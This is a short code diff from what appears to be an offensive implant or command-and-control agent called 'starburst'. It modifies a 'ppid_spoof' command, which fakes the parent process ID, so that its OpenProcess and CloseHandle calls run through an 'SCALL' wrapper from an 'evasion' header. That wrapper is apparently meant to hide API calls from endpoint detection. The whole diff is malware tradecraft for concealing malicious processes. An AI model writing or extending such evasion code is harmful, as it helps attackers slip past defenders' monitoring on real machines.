@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PPID_SPOOF
 
@@ -24,7 +25,7 @@ auto declfn starburst::cmd_ppid_spoof(
         return;
     }
 
-    HANDLE h_process = inst.kernel32.OpenProcess(
+    HANDLE h_process = (HANDLE)SCALL( inst, kernel32.OpenProcess,
         PROCESS_QUERY_INFORMATION, FALSE, ppid );
 
     if ( !h_process ) {
@@ -42,7 +43,7 @@ auto declfn starburst::cmd_ppid_spoof(
         return;
     }
 
-    inst.kernel32.CloseHandle( h_process );
+    SCALL( inst, kernel32.CloseHandle, h_process );
     inst.ppid_spoof = ppid;
 
     char msg[64] = { 0 };
